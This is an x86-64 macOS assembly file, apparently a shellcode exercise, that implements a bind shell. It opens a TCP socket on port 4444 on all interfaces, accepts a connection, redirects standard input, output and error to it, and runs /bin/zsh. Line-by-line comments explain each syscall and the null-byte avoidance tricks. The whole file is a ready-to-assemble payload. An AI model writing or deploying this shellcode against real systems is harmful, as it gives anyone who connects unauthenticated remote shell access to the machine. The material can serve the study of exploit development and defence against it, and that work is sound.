bits 64

global _main

_main:
   ; socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
   PUSH 0x2             ; Store 0x2 on stack
   POP RDI              ; Pop this value into RDI -> AF_INET

   PUSH 0x1             ; Store 0x1 on stack
   POP RSI              ; Pop this value into RSI -> SOCK_STREAM

   XOR RDX,RDX          ; Null out RDX -> IPPROTO_IP

   PUSH 97              ; socket() syscall - 97
   POP RAX
   BTS RAX,25
   SYSCALL

   MOV R9,RAX           ; Save socket fd in R9


   ; bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));
   MOV RDI,R9           ; RDI -> socket file descriptor

   ;; sockaddr
   XOR RSI,RSI          ; Null out RSI
   PUSH RSI             ; RSI -> sin_zero -> 0x0000000000000000

   MOV ESI,0x5C110201   ; ESI (4 byte register) -> sin_port=0x115c, sin_family=0x02, sin_len=0x01
   DEC ESI              ; 0x5C110201-0x01 -> 0x5C110200 -> sin_len=0x00
   PUSH RSI             ; RSI (8 byte register) -> sin_addr=0x00000000 + ESI -> 0x000000005C110200
   
   PUSH RSP
   POP RSI              ; RSI = RSP = pointer to the structure we pushed previously

   ;; sizeof(addr)
   PUSH 0x10            ; Place 0x10 (16) on stack
   POP RDX              ; RDX -> sizeof struct -> 16 bytes -> 0x10

   ;; syscall bind()
   PUSH 104             ; bind() syscall - 104
   POP RAX
   BTS RAX,25
   SYSCALL

   ; listen(sockfd, 0);
   MOV RDI,R9           ; RDI -> socket file descriptor
   XOR RSI,RSI          ; RSI -> NULL (0x00)

   PUSH 106             ; listen() syscall - 106
   POP RAX
   BTS RAX,25
   SYSCALL

   
   ; accept(sockfd, NULL, NULL);
   MOV RDI,R9           ; RDI -> Socket file descritpro
   XOR RSI,RSI          ; RSI -> NULL
   XOR RDX,RDX          ; RDX -> NULL

   PUSH 30              ; accept() syscall - 30
   POP RAX
   BTS RAX,25
   SYSCALL
   MOV R10,RAX         ; Save connection file descriptor in R10


   ; dup2(connfd,i)
   MOV RDI,R10          ; RDI -> Connection file descriptor
   PUSH 2
   POP RSI              ; RSI -> 2
dup2_loop:
   PUSH 90              ; dup2() syscall - 90
   POP RAX
   BTS RAX,25
   SYSCALL

   DEC RSI              ; Decrementing RSI by 1
   JNS dup2_loop        ; Jump back to dup2_loop if RSI>=0

   ; execve("/bin/zsh", "/bin/zsh", NULL);
   XOR RDX,RDX          ; RDX -> NULL

   PUSH RDX             ; Store NULL on stack
   MOV RBX,'/bin/zsh'   ; Store /bin/zsh in RBX
   PUSH RBX             ; Push it onto the stack
   MOV RDI,RSP          ; RDI -> /bin/zsh

   PUSH RDX             ; argv[1] -> NULL
   PUSH RDI             ; argv[0] -> /bin/zsh
   MOV RSI,RSP          ; Store {"/bin/zsh",NULL} in RSI

   PUSH 59              ; execve() syscall - 59
   POP RAX
   BTS RAX,25
   SYSCALL
